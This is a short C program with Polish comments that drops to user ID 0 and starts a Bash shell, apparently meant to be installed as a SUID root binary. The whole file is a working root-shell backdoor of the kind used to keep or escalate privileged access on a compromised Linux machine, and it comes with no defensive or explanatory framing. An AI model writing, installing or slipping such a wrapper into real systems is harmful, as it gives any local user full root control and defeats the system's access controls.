#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(void) {
  // Ustawienie praw SUID
  if (setuid(0) < 0) {
    perror("setuid");
    return 1;
  }

  // Uruchomienie powłoki Bash z prawami roota
  if (execl("/bin/bash", "bash", NULL) < 0) {
    perror("execl");
    return 1;
  }

  return 0;
}

